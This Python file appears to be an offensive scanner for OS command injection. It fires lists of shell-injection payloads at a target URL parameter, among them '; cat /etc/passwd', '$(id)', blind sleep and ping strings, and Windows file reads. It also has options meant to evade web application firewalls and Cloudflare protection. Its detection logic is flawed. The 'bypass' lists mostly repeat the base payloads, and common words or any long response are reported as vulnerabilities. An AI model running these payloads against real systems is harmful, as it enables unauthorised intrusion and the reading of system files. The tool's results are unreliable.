import requests
import urllib.parse
import time
import random
import re
from bs4 import BeautifulSoup

class OSCommandInjectionScanner:
    def __init__(self):
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "CF_BYPASS": False,
            "WAF_BYPASS": False,
            "RANDOM_CASE": False,
            "RANDOM_SPACE": False,
            "COMMENT_BYPASS": False,
            "HEX_ENCODE": False,
            "URL_ENCODE": True,
            "BLIND_PAYLOAD": False,
            "TIME_BASED": True,
            "OUTPUT_BASED": True
        }
        
        self.payloads = [
            "; ls -la",
            "& ls -la",
            "| ls -la",
            "`ls -la`",
            "$(ls -la)",
            "; dir",
            "& dir",
            "| dir",
            "`dir`",
            "$(dir)",
            "; id",
            "& id",
            "| id",
            "`id`",
            "$(id)",
            "; whoami",
            "& whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "; pwd",
            "& pwd",
            "| pwd",
            "`pwd`",
            "$(pwd)",
            "; uname -a",
            "& uname -a",
            "| uname -a",
            "`uname -a`",
            "$(uname -a)",
            "; cat /etc/passwd",
            "& cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; type C:\\Windows\\win.ini",
            "& type C:\\Windows\\win.ini",
            "| type C:\\Windows\\win.ini",
            "`type C:\\Windows\\win.ini`",
            "$(type C:\\Windows\\win.ini)"
        ]
        
        self.blind_payloads = [
            "; sleep 5",
            "& sleep 5",
            "| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; ping -c 5 127.0.0.1",
            "& ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
            "`ping -c 5 127.0.0.1`",
            "$(ping -c 5 127.0.0.1)",
            "; timeout 5",
            "& timeout 5",
            "| timeout 5",
            "`timeout 5`",
            "$(timeout 5)",
            "; ping -n 5 127.0.0.1",
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "`ping -n 5 127.0.0.1`",
            "$(ping -n 5 127.0.0.1)"
        ]
        
        self.waf_bypass_payloads = [
            "; ls -la",
            "& ls -la",
            "| ls -la",
            "`ls -la`",
            "$(ls -la)",
            "; dir",
            "& dir",
            "| dir",
            "`dir`",
            "$(dir)",
            "; id",
            "& id",
            "| id",
            "`id`",
            "$(id)",
            "; whoami",
            "& whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "; pwd",
            "& pwd",
            "| pwd",
            "`pwd`",
            "$(pwd)",
            "; uname -a",
            "& uname -a",
            "| uname -a",
            "`uname -a`",
            "$(uname -a)",
            "; cat /etc/passwd",
            "& cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; type C:\\Windows\\win.ini",
            "& type C:\\Windows\\win.ini",
            "| type C:\\Windows\\win.ini",
            "`type C:\\Windows\\win.ini`",
            "$(type C:\\Windows\\win.ini)",
            "|| ls -la",
            "&& ls -la",
            "|| dir",
            "&& dir",
            "|| id",
            "&& id",
            "|| whoami",
            "&& whoami",
            "|| pwd",
            "&& pwd",
            "|| uname -a",
            "&& uname -a",
            "|| cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| type C:\\Windows\\win.ini",
            "&& type C:\\Windows\\win.ini"
        ]
        
        self.cf_bypass_payloads = [
            "; ls -la",
            "& ls -la",
            "| ls -la",
            "`ls -la`",
            "$(ls -la)",
            "; dir",
            "& dir",
            "| dir",
            "`dir`",
            "$(dir)",
            "; id",
            "& id",
            "| id",
            "`id`",
            "$(id)",
            "; whoami",
            "& whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "; pwd",
            "& pwd",
            "| pwd",
            "`pwd`",
            "$(pwd)",
            "; uname -a",
            "& uname -a",
            "| uname -a",
            "`uname -a`",
            "$(uname -a)",
            "; cat /etc/passwd",
            "& cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; type C:\\Windows\\win.ini",
            "& type C:\\Windows\\win.ini",
            "| type C:\\Windows\\win.ini",
            "`type C:\\Windows\\win.ini`",
            "$(type C:\\Windows\\win.ini)",
            "|| ls -la",
            "&& ls -la",
            "|| dir",
            "&& dir",
            "|| id",
            "&& id",
            "|| whoami",
            "&& whoami",
            "|| pwd",
            "&& pwd",
            "|| uname -a",
            "&& uname -a",
            "|| cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| type C:\\Windows\\win.ini",
            "&& type C:\\Windows\\win.ini"
        ]
        
        self.output_indicators = [
            "root:", "daemon:", "bin:", "sys:", "adm:", "lp:",
            "shutdown", "halt", "reboot",
            "uid=", "gid=", "groups=",
            "Linux", "Ubuntu", "Debian", "CentOS", "Red Hat", "Windows",
            "Microsoft Windows", "OS/2", "FreeBSD", "OpenBSD", "NetBSD",
            "DRIVER=", "COMSPEC=", "PATH=", "SystemRoot=", "windir=",
            "[boot loader]", "[operating systems]",
            "Directory of", " Volume in drive", " Volume Serial Number",
            "total ", "drwxr", "lrwxr", "-rw-r"
        ]
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def process_payload(self, payload):
        if self.get_option("RANDOM_CASE"):
            payload = self.random_case(payload)
        
        if self.get_option("RANDOM_SPACE"):
            payload = self.random_space(payload)
        
        if self.get_option("COMMENT_BYPASS"):
            payload = self.comment_bypass(payload)
        
        if self.get_option("HEX_ENCODE"):
            payload = self.hex_encode(payload)
        
        if self.get_option("URL_ENCODE"):
            payload = urllib.parse.quote(payload)
        
        return payload
    
    def random_case(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
    
    def random_space(self, payload):
        result = []
        for c in payload:
            result.append(c)
            if c == ' ' and random.random() > 0.5:
                result.append(random.choice([' ', '/**/', '%20', '+']))
        return ''.join(result)
    
    def comment_bypass(self, payload):
        return payload.replace(' ', '/**/')
    
    def hex_encode(self, payload):
        return '0x' + payload.encode('utf-8').hex()
    
    def get_cloudflare_cookies(self, url):
        try:
            session = requests.Session()
            response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
            
            if 'cf_clearance' in response.cookies:
                return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            soup = BeautifulSoup(response.text, 'html.parser')
            js_challenge = soup.find('script', string=re.compile('setTimeout'))
            
            if js_challenge:
                time.sleep(5)
                response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
                if 'cf_clearance' in response.cookies:
                    return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            return None
        except:
            return None
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = int(self.get_option("DELAY"))
        
        headers = {
            "User-Agent": self.get_option("USER_AGENT"),
            "Cookie": self.get_option("COOKIE")
        }
        
        if self.get_option("HEADERS"):
            try:
                for header in self.get_option("HEADERS").split("\\n"):
                    if ":" in header:
                        key, value = header.split(":", 1)
                        headers[key.strip()] = value.strip()
            except:
                pass
        
        cookies = {}
        
        if self.get_option("CF_BYPASS"):
            cf_cookies = self.get_cloudflare_cookies(url)
            if cf_cookies:
                cookies.update(cf_cookies)
        
        vulnerabilities = []
        
        payloads_to_test = self.payloads
        
        if self.get_option("BLIND_PAYLOAD"):
            payloads_to_test = self.blind_payloads
        
        if self.get_option("WAF_BYPASS"):
            payloads_to_test = self.waf_bypass_payloads
        
        if self.get_option("CF_BYPASS"):
            payloads_to_test = self.cf_bypass_payloads
        
        for i, payload in enumerate(payloads_to_test, 1):
            if delay > 0:
                time.sleep(delay)
            
            processed_payload = self.process_payload(payload)
            
            vulnerable, vuln_type = self.test_payload(url, param, processed_payload, method, timeout, headers, cookies)
            
            if vulnerable:
                vulnerabilities.append({
                    "payload": payload,
                    "type": vuln_type,
                    "parameter": param
                })
        
        if vulnerabilities:
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def test_payload(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            if self.get_option("OUTPUT_BASED"):
                for indicator in self.output_indicators:
                    if indicator.lower() in response.text.lower():
                        return True, "Output-based OS Command Injection"
            
            if len(response.text) > 10000:
                return True, "Output-based OS Command Injection (large response)"
            
        except requests.exceptions.Timeout:
            if self.get_option("TIME_BASED") and ("sleep" in payload.lower() or "ping" in payload.lower() or "timeout" in payload.lower()):
                return True, "Time-based OS Command Injection"
        except Exception:
            pass
        
        return False, None
